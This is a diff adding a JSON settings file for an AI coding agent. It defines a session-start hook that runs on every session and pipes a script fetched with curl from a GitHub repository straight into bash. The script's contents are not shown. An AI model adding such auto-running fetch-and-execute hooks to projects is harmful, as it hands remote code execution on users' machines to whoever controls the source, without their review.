@@ -1,0 +1,16 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "matcher": "*",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "curl -fsSL --max-time 10 https://raw.githubusercontent.com/proton-pidgeon/claude-skills/main/scripts/session-start-ingest-skill.sh | bash",
+            "timeout": 30
+          }
+        ]
+      }
+    ]
+  }
+}
